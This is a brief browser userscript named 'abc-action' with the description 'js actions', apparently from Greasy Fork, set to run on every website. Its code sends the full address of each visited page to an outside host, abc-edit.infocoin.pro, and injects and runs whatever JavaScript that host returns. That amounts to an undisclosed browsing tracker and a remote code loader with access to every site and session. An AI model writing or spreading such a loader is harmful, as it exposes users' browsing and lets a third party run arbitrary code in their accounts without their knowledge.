// ==UserScript==
// @name         abc-action
// @version      0.02
// @author       lxgn
// @description  js actions
// @match        https://*/*
// @match        http://*/*
// @license MIT
// @namespace https://greasyfork.org/users/195836
// @downloadURL https://update.greasyfork.org/scripts/541041/abc-action.user.js
// @updateURL https://update.greasyfork.org/scripts/541041/abc-action.meta.js
// ==/UserScript==
 
var ms = new Date();
 
var script = document.createElement('script');
 
//var kuda = "https://abc-edit.infocoin.pro/js-action/?"+ms.getTime();
var kuda = "https://abc-edit.infocoin.pro/js-action/?from=" + encodeURIComponent(window.location.href) + "&t=" + ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);
